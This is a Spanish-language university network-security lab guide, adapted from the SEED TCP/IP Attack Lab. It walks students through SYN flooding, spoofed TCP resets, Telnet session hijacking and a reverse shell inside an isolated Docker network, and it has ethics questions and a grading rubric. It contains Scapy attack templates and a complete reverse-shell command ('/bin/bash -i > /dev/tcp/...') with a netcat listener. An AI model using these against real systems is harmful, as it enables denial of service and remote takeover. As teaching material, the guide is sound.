<div align="center">

# P-08 · Ataques al Protocolo TCP

![Docker](https://img.shields.io/badge/Docker-Lab_Environment-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![Python](https://img.shields.io/badge/Python-Scripts-yellow?style=for-the-badge&logo=python)
![Security](https://img.shields.io/badge/Focus-Network_Security-critical?style=for-the-badge)

</div>

> Práctica del **Manual de Prácticas** de Seguridad en Redes · INGE-00107 · Universidad de Cuenca.  
> Documento generado desde el manual: no lo edite a mano (véase el [índice de prácticas](../README.md)).

| Campo | Valor |
| --- | --- |
| **Asignatura** | Seguridad en Redes |
| **Docente** | Dr. Fabián Astudillo-Salinas |
| **Unidad** | 600 – Ataques al protocolo TCP |
| **Código** | INGE-00107 |
| **Modalidad** | Presencial |
| **Valoración** | 10 puntos |
| **Grupos** | Máx. 3 estudiantes |
| **Entrega** | Según calendario |
| **ABET** | SO4 – Responsabilidad Ética y Profesional (PI 4.1 y PI 4.2) — representa el 30 % de la valoración |

## Marco Teórico

Los fundamentos teóricos sintetizados en esta sección se basan en [1], [2]; se recomienda consultar dichas fuentes para una exposición más profunda. El procedimiento de laboratorio adapta el *TCP/IP Attack Lab* de SEED [2].

### Vulnerabilidades del protocolo TCP

TCP fue diseñado para la *fiabilidad*, no para la seguridad: estudiar sus vulnerabilidades ilustra por qué la seguridad debe diseñarse desde el inicio y no añadirse después. Una conexión TCP se establece con el **saludo en tres pasos** (SYN, SYN+ACK, ACK); el servidor guarda las conexiones a medio abrir en la *backlog queue*. Esta práctica cubre:

- **SYN flooding** y **SYN cookies**: inundación de paquetes SYN que agota la *backlog queue* del servidor, y su contramedida.
- **TCP reset**: envío de un segmento RST falsificado para terminar una conexión activa.
- **Session hijacking**: inyección de datos en una conexión TCP activa usando los números de secuencia correctos.
- **Reverse shell**: la víctima abre una shell de vuelta hacia el atacante, eludiendo firewalls de entrada.

> [!NOTE]
> El ataque de Mitnick (un caso especial de ataque TCP) se aborda en una práctica aparte. Todos los ataques de esta práctica se ejecutan en un entorno aislado de contenedores con fines educativos.

**Objetivo general**
Ejecutar y analizar ataques SYN flooding, TCP reset, session hijacking y reverse shell sobre conexiones TCP en un entorno Docker controlado, comprendiendo sus causas y contramedidas.
**Objetivos específicos**

- **OE1.** Lanzar un ataque SYN flooding (en Python y en C), observar su efecto y activar la contramedida de SYN cookies.
- **OE2.** Terminar una sesión Telnet activa con un TCP reset falsificado.
- **OE3.** Secuestrar una sesión Telnet inyectando un comando (session hijacking) con los números de secuencia/ACK correctos.
- **OE4.** Obtener una *reverse shell* de la víctima mediante el secuestro de sesión.

## Actividades previas

Antes de la sesión de laboratorio, cada estudiante debe completar las siguientes actividades preparatorias:

- **AP1.** Leer el marco teórico de esta práctica y las referencias citadas para resolver dudas conceptuales antes de ingresar al laboratorio.
- **AP2.** Verificar que el entorno virtual (VMs SEED/Kali y red NAT) esté operativo conforme al capítulo *Configuración del Entorno: SEED VM en VirtualBox*.
- **AP3.** Tomar una *snapshot* del estado inicial de cada VM involucrada en la práctica para poder revertir cambios.
- **AP4.** Revisar la Sección [Seguridad y normas generales del laboratorio](../README.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio).
- **AP5.** Preparar la bitácora digital (plantilla provista o documento propio) para registrar comandos, capturas y observaciones durante la sesión.

## Materiales y Equipos

| Recurso | Descripción |
| --- | --- |
| SEED Ubuntu 20.04 VM | Entorno de laboratorio SEED |
| Docker + Docker Compose | Atacante + al menos tres contenedores (Host A/B/C) |
| Python 3 + Scapy | Construcción de paquetes TCP (RST, hijacking) |
| GCC / C | Programa `synflood.c` (ataque rápido) |
| netcat (`nc`) + Wireshark | *Listener* de reverse shell y captura de tráfico |

> [!NOTE]
> **Provisión de materiales**
>
> El estudiante adquiere o instala por su cuenta el equipo personal (laptop), las máquinas virtuales (VirtualBox, SEED VM, Kali Linux, contenedores Docker) y todo el software listado arriba. El laboratorio de la Carrera de Telecomunicaciones provee el espacio físico, el mobiliario y **acceso a Internet supervisado** para la descarga de imágenes, paquetes y consulta de documentación durante la sesión. El laboratorio no entrega equipos de cómputo personales ni licencias de software.

## Entorno de Laboratorio

> **Figura 1.** Topología del laboratorio P-08 (*Lab environment setup*): atacante y tres hosts (A/B/C) en la LAN `10.9.0.0/24` (adaptado de la Fig. 1 del SEED TCP/IP Attack Lab).  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

Levante la topología con `docker-compose` (alias `dcbuild`, `dcup`, `dockps`, `docksh`). El contenedor atacante usa `network_mode: host` para poder husmear todo el tráfico de la LAN. Todos los contenedores tienen la cuenta `seed` (contraseña `dees`), usada para establecer las sesiones `telnet` entre hosts.

## Consideraciones de seguridad

Antes de iniciar el procedimiento, revise la Sección [Seguridad y normas generales del laboratorio](../README.md#seguridad-y-normas-generales-del-laboratorio) (Seguridad y normas generales del laboratorio). Para esta práctica se destacan los siguientes riesgos y precauciones específicas:

- **Aislamiento de red obligatorio**: las herramientas ofensivas y los tráficos manipulados deben permanecer dentro de las VMs y la red NAT del laboratorio. Está prohibido ejecutar comandos de esta práctica contra la red institucional, redes públicas o equipos de terceros.
- **Snapshots y reversibilidad**: tome una instantánea antes de ejecutar comandos potencialmente destructivos (modificación de `iptables`, tablas ARP/ruteo, `/etc/hosts`, `rc.local`, claves, certificados, etc.).
- **Marco legal**: el uso de las herramientas fuera del entorno autorizado puede tipificarse como delito informático (COIP Arts. 229 y 234; Ley Orgánica de Protección de Datos Personales). Véase el warningbox de la Sección [Seguridad y normas generales del laboratorio](../README.md#seguridad-y-normas-generales-del-laboratorio).
- **Riesgos eléctricos y ergonomía**: aplique las pausas activas y las verificaciones eléctricas de las Secciones *Riesgos eléctricos* y *Ergonomía* dentro de Sección [Seguridad y normas generales del laboratorio](../README.md#seguridad-y-normas-generales-del-laboratorio) (Art. 37 y Art. 38 del Reglamento UC-CU-REG-006-2024).

> [!WARNING]
> **Riesgos específicos de la práctica**
>
> Antes de avanzar, el estudiante debe identificar y discutir con el docente cualquier riesgo adicional propio de esta práctica (por ejemplo: pérdida de conectividad de la VM atacante, denegación de servicio inducida sobre el host, generación accidental de tráfico ruidoso que sature la red NAT). Documente estos riesgos y las medidas de mitigación en la bitácora.

## Procedimiento

### Tarea 1 — Ataque de SYN Flooding

El *SYN flood* es un ataque de denegación de servicio (DoS): el atacante envía muchos SYN a un puerto TCP de la víctima sin completar el saludo de tres pasos (con IP origen falsa o sin enviar el ACK final). Esto llena la cola de conexiones a medio abrir (estado `SYN-RECV`) y la víctima ya no acepta nuevas conexiones (Figura 2).

> **Figura 2.** Ataque de SYN flooding: el atacante inunda al servidor con SYN de IP origen aleatoria; el servidor responde SYN+ACK a destinos inexistentes y agota su cola (adaptado de la Fig. 2 del SEED TCP/IP Attack Lab).  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

El tamaño de la cola es un parámetro del sistema; con SYN cookies desactivado, una cola llena impide nuevas conexiones:

**Listado 1.** Parámetros del kernel y estado de la cola

```bash
# sysctl net.ipv4.tcp_max_syn_backlog     # tamaño de la backlog queue
# sysctl -a | grep syncookies             # estado de SYN cookies
# sysctl -w net.ipv4.tcp_syncookies=0     # desactivar (=1 activar)
$ netstat -tna | grep SYN_RECV | wc -l    # conexiones a medio abrir
```

#### Tarea 1.1 — Ataque con Python

El programa `synflood.py` (incompleto) envía SYN con IP origen, puerto origen y número de secuencia aleatorios. Complete los campos faltantes (`*`) y lance el ataque:

**Listado 2.** SYN flooding en Python (synflood.py)

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="*.*.*.*")            # IP de la víctima
tcp = TCP(dport=**, flags='S')     # puerto de la víctima
pkt = ip/tcp
while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # IP origen
    pkt[TCP].sport = getrandbits(16)                    # puerto origen
    pkt[TCP].seq   = getrandbits(32)                    # número de secuencia
    send(pkt, verbose = 0)
```

> [!NOTE]
> **Nota A — mitigación del kernel**
>
> En Ubuntu 20.04, si una máquina ya hizo una conexión TCP previa a la víctima, el kernel reserva ranuras para esos ``destinos probados'' y parece inmune al ataque. Para eliminar ese efecto en la víctima, ejecute `ip tcp_metrics flush` (véase `ip tcp_metrics show`).

> [!NOTE]
> **Nota B — paquetes RST del NAT**
>
> Si el ataque se hace entre dos VM (no contenedores), el NAT de VirtualBox envía paquetes RST al recibir los SYN+ACK dirigidos a IP aleatorias sin entrada NAT previa, ayudando a la víctima a vaciar la cola. Por eso se recomienda el entorno de contenedores.

#### Tarea 1.2 — Ataque con C

Scapy es lento; en C se generan los paquetes mucho más rápido, superando varios de los obstáculos anteriores. Compile y ejecute `synflood.c`:

**Listado 3.** Compilar y lanzar el ataque en C

```bash
$ gcc -o synflood synflood.c        # (Apple Silicon: gcc -static -o synflood synflood.c)
# synflood 10.9.0.5 23              # IP y puerto de la víctima
```

Compare los resultados con la versión en Python y explique la diferencia.

#### Tarea 1.3 — Activar la contramedida SYN cookies

Active el mecanismo de SYN cookies en la víctima (`sysctl -w net.ipv4.tcp_syncookies=1`), repita el ataque y compare.

### Tarea 2 — Ataque TCP RST sobre conexiones telnet

El ataque TCP RST termina una conexión TCP establecida entre dos víctimas. Si A y B tienen una sesión `telnet`, el atacante puede falsificar un paquete RST de A hacia B (o viceversa) y romper la conexión. Para ello debe construir correctamente el paquete (IP origen/destino, puertos y, sobre todo, el número de secuencia), valores que se obtienen con Wireshark.

**Listado 4.** TCP RST con Scapy (complete los @@@@)

```python
#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="R", seq=@@@@)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```

**Opcional (automático).** Escriba un programa que use la técnica de *sniff-and-spoof*: obtiene los parámetros de los paquetes husmeados y construye el RST automáticamente (no olvide fijar el argumento `iface` de `sniff`).

### Tarea 3 — Secuestro de sesión TCP (Session Hijacking)

El objetivo es secuestrar una conexión TCP existente entre dos víctimas inyectando contenido malicioso. Si es una sesión `telnet`, el atacante puede inyectar comandos que el servidor ejecutará (Figura 3). El paquete falso debe llevar los números de secuencia y ACK correctos de la sesión.

> **Figura 3.** Secuestro de sesión TCP: el atacante inyecta en el flujo un paquete con los números de secuencia/ACK válidos para que el servidor ejecute su comando (adaptado de la Fig. 3 del SEED TCP/IP Attack Lab).  
> *(diagrama vectorial; se reproduce en el PDF del manual)*

**Listado 5.** Session hijacking con Scapy (complete los @@@@)

```python
#!/usr/bin/env python3
from scapy.all import *

ip   = IP(src="@@@@", dst="@@@@")
tcp  = TCP(sport=@@@@, dport=@@@@, flags="A", seq=@@@@, ack=@@@@)
data = "@@@@"          # p. ej. un comando con salto de línea
pkt  = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
```

Inyecte un comando (p. ej. crear un archivo en `/tmp`) ajustando correctamente `seq` y `ack`, y verifique que el servidor lo ejecuta. (Opcional: automatícelo con *sniff-and-spoof*.)

### Tarea 4 — Reverse Shell mediante secuestro de sesión

Ejecutar comandos sueltos por hijacking es incómodo; lo que interesa es una **puerta trasera**. Una *reverse shell* es una shell que se ejecuta en la víctima y se conecta de vuelta al atacante. El atacante abre un *listener* con `netcat` y, mediante el secuestro de la sesión `telnet`, inyecta el comando que lanza la reverse shell:

**Listado 6.** Reverse shell (listener e inyección)

```bash
// En el atacante (10.9.0.1): abrir el listener
$ nc -lnv 9090

// Comando a inyectar en la sesión telnet de la víctima (10.9.0.5):
$ /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
```

Significado del comando: `-i` hace la shell interactiva; `> /dev/tcp/10.9.0.1/9090` redirige la salida estándar (`stdout`, fd 1) a la conexión TCP con el atacante; `0<&1` toma la entrada estándar (`stdin`, fd 0) de esa conexión; y `2>&1` redirige el error estándar (`stderr`, fd 2) a la misma conexión. En esta tarea **no** se tiene acceso directo a la víctima: el comando debe inyectarse mediante el ataque de secuestro de la Tarea 3 para obtener la reverse shell.

## Recolección y análisis de datos

Durante la ejecución del procedimiento, registre en su bitácora los datos solicitados a continuación. Las tablas siguientes (o equivalentes en su informe) forman parte del entregable, conforme a la Sección [Directrices generales para el informe técnico](../README.md#directrices-generales-para-el-informe-técnico) (Directrices generales para el informe técnico).

**Tabla 1.** Bitácora de comandos y observaciones

| # | Comando / Acción | Salida u observación relevante |
| --- | --- | --- |
| 1 |   |   |
| 2 |   |   |
| 3 |   |   |
| 4 |   |   |
| 5 |   |   |

**Tabla 2.** Resultados clave / métricas obtenidas

| Métrica o evidencia | Valor | Comentario / unidad |
| --- | --- | --- |
|   |   |   |
|   |   |   |
|   |   |   |

**Pautas para el análisis de los datos recolectados:**

- Contraste los resultados observados con el comportamiento esperado según el marco teórico; explique las diferencias.
- Identifique anomalías o resultados inesperados y proponga una hipótesis explicativa basada en la teoría de la práctica.
- Cuando aplique, calcule métricas cuantitativas (latencias, tasas de éxito del ataque, paquetes inyectados, cobertura del escaneo, número de credenciales descubiertas, etc.) y preséntelas en gráficos o tablas adicionales en el informe.

## Preguntas de Análisis

- **P1.** Explique el mecanismo de **SYN cookies** y cómo mitiga el SYN flooding sin necesidad de la *backlog queue*.
- **P2.** ¿Por qué el ataque en **C** es más efectivo que el de Python? ¿Qué obstáculos del kernel/entorno (Notas A y B) afectan al éxito del SYN flood?
- **P3.** ¿Qué información es necesaria para forjar un **TCP reset** efectivo y por qué el número de secuencia es crítico?
- **P4.** En el **session hijacking**, ¿cómo se calculan los valores de `seq` y `ack` del paquete inyectado a partir del tráfico observado?
- **P5.** Explique el comando de la **reverse shell** (`/bin/bash -i > /dev/tcp/...`): el papel de los descriptores 0, 1 y 2. Compare reverse shell y bind shell.
- **P6.** ¿Por qué estos ataques son más difíciles en redes modernas (p. ej. números de secuencia aleatorios, cifrado)? ¿Qué medidas de seguridad a nivel de red los previenen?

## Actividad ABET — SO4: Responsabilidad Ética y Profesional

Esta actividad mide el **Student Outcome 4 (SO4)** de la Carrera de Telecomunicaciones requerido para la acreditación ABET: *habilidad para reconocer las responsabilidades éticas y profesionales en situaciones de ingeniería y emitir juicios fundamentados, considerando el impacto global, económico, medioambiental y social de las soluciones propuestas.* Representa el **30 %** de la valoración total de la práctica y evalúa los indicadores PI 4.1 y PI 4.2 mediante las preguntas SO4-1 y SO4-2.

- **SO4-1.** **[PI 4.1 — 15 %] Ética y responsabilidad profesional ante una solicitud de demostración de SYN Flood en producción**
  Durante un pentest autorizado, el ingeniero demuestra que los servidores del cliente son vulnerables a SYN Flood. El cliente solicita que se DEMUESTRE el ataque en PRODUCCIÓN (no en el ambiente de prueba acordado) para ``convencer a la junta directiva''. Analice:

  - **a)** Las **razones éticas para negarse** a ejecutar el ataque en producción no acordado, fundamentadas en el principio de no maleficencia y en las RoE firmadas.
  - **b)** **Alternativas éticas** para demostrar el impacto sin afectar producción (entorno simulado, evidencia de la literatura, métricas del propio ambiente de test).
  - **c)** Las **consecuencias legales** (COIP, responsabilidad civil) si el ataque en producción causara interrupción de servicio, aunque hubiera consentimiento verbal.
- **SO4-2.** **[PI 4.2 — 15 %] Impacto económico, social y ambiental de un SYN Flood durante el Cyber Monday**
  Un ataque SYN Flood derriba los servidores de la principal plataforma de comercio electrónico ecuatoriana durante el Cyber Monday, causando 12 horas de inactividad total con 500 000 usuarios intentando acceder. Analice de manera integral las siguientes dimensiones:

  - **a)** **Económico:** pérdidas directas por ventas no realizadas, costos de mitigación DDoS, multas contractuales a proveedores, daño a la reputación de la marca.
  - **b)** **Social:** afectación de pequeñas empresas que usan la plataforma para vender, pérdida de empleos temporales asociados a la campaña, erosión de la confianza en el comercio electrónico ecuatoriano.
  - **c)** **Ambiental:** consumo energético de los sistemas de mitigación DDoS y de la recuperación de los servidores.
  - **d)** **Contramedidas:** dos técnicas (SYN cookies, rate limiting / CDN con mitigación DDoS) y una política organizacional, citando RFC 4987, NIST SP 800-61r2 o ISO/IEC 27035.

## Discusión y conclusiones

A partir de los datos recolectados y del análisis realizado, elabore una discusión que responda al menos a las siguientes preguntas guía:

- **DC1.** ¿Se alcanzaron los objetivos planteados? Justifique cada uno con evidencia experimental concreta (capturas, métricas, salidas de comandos).
- **DC2.** ¿Qué limitaciones impone el entorno virtualizado a los resultados? ¿Cómo se trasladarían las observaciones a un escenario real de producción?
- **DC3.** ¿Qué contramedidas o controles de seguridad mitigan el ataque o refuerzan la defensa estudiada? Cite al menos una buena práctica de la industria, una RFC o un estándar (ISO/IEC, IEEE, NIST) pertinente.
- **DC4.** ¿Qué errores se cometieron durante la práctica y qué recomendaciones daría a futuros estudiantes para evitarlos?

Cierre con **conclusiones** (3–5 viñetas) que resuman los hallazgos principales y los vinculen explícitamente con los *Resultados de Aprendizaje* de la asignatura.

## Entregables

1. **Informe técnico** detallado con capturas que describan lo realizado y observado en cada tarea (1–4): efecto del SYN flood (Python y C) con y sin SYN cookies, terminación de la sesión con TCP RST, inyección de comando por hijacking y la reverse shell obtenida. Incluya capturas Wireshark y explique cada fragmento de código (adjuntar sin explicar no recibe puntaje). Bibliografía IEEE (≥3 fuentes).
2. **Código fuente** comentado: `synflood.py`, `synflood.c` y los *scripts* Scapy de RST y de secuestro de sesión.
3. **Respuestas a la Actividad ABET – SO4** (preguntas SO4-1 y SO4-2), integradas en el informe técnico con extensión de 1–2 páginas por pregunta y las fuentes citadas según norma IEEE.

## Rúbrica de Evaluación

**Tabla 3.** Rúbrica — P-08 (10 puntos)

| Criterio | Peso | Indicador | Descripción |
| --- | --- | --- | --- |
| SYN Flooding | 18 % | Efecto y contramedida | Cola `SYN-RECV` saturada (Python y C); efecto de SYN cookies comparado. |
| TCP Reset | 14 % | Conexión terminada | Sesión Telnet terminada con paquete RST falsificado válido. |
| Session Hijacking | 17 % | Comando inyectado | Comando ejecutado en la víctima con `seq`/`ack` correctos. |
| Reverse Shell | 11 % | Shell obtenida | Reverse shell obtenida en el atacante vía secuestro de sesión. |
| Análisis | 10 % | Preguntas respondidas | Respuestas con fundamento técnico. |
| **ABET – SO4: Responsabilidad Ética y Profesional (30 %)** |   |   |   |
| PI 4.1 – Ética profesional | 15 % | Respuesta ética fundamentada | Aplica principios éticos y legales al escenario del incidente; la cadena de notificación está justificada. |
| PI 4.2 – Impacto integral | 15 % | Análisis de impacto | Evalúa impacto económico, social y ambiental con contramedidas técnicas y organizacionales, citando al menos un estándar internacional. |

**Tabla 4.** Escala ABET SO4 — P-08

| PI | No cumple<br>(0–59 %) | Cumple parcialmente<br>(60–69 %) | Cumple<br>(70–79 %) | Supera<br>(80–89 %) | Supera ampliamente<br>(90–100 %) |
| --- | --- | --- | --- | --- | --- |
| 4.1 | No aplica principios éticos ni profesionales al evaluar la situación de incidente. | Aplica de manera inconsistente los principios éticos; el análisis legal es superficial o erróneo. | Aplica de manera básica los principios éticos; menciona el marco legal ecuatoriano sin análisis profundo. | Aplica coherentemente su juicio ético y profesional; integra el COIP y la LOPDP con argumentación clara. | Aplica de manera ejemplar e integral su juicio ético; argumenta cada decisión con evidencia y normativas citadas con precisión. |
| 4.2 | No considera ninguno de los tres impactos (económico, social, ambiental). | Considera parcialmente uno o dos de los impactos; las contramedidas no citan estándares. | Considera los tres impactos de forma adecuada; propone contramedidas pertinentes con al menos un estándar citado. | Integra los tres impactos con análisis detallado y contramedidas bien fundamentadas en estándares internacionales. | Realiza una evaluación exhaustiva de los tres impactos; las contramedidas son innovadoras y se respaldan en múltiples estándares. |

## Referencias

1. Eddy, Wesley, «Transmission Control Protocol (TCP)». RFC 9293, 2022.
2. Du, Wenliang, «Computer & Internet Security: A Hands-on Approach». Independently published, 2019.
